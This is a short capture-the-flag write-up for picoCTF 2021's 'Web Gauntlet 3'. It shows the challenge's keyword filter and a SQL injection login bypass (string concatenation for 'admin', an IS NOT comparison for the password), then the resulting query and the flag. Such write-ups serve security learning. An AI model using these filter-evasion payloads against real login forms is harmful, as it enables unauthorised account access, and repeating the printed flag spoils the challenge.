# Web Gauntlet 3

```markdown
Tags: `picoCTF2021` `Web Exploitation`
```

## **Description**

Last time, I promise! Only 25 characters this time. Log in as admin Site: [http://mercury.picoctf.net:8650/](http://mercury.picoctf.net:8650/) Filter: [http://mercury.picoctf.net:8650/filter.php](http://mercury.picoctf.net:8650/filter.php)

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

The filter of this round: or and true false union like = > < ; -- /\* \*/ admin

```sql
Username: ad'||'min
password: 1' IS NOT '2
```

```sql
SELECT username, password FROM users WHERE username='ad'||'min' AND password='1' IS NOT '2' 
```

## Flag

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p><code>picoCTF{k3ep_1t_sh0rt_6fdd78c92c7f26a10acd3ece176dea4d}</code></p></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
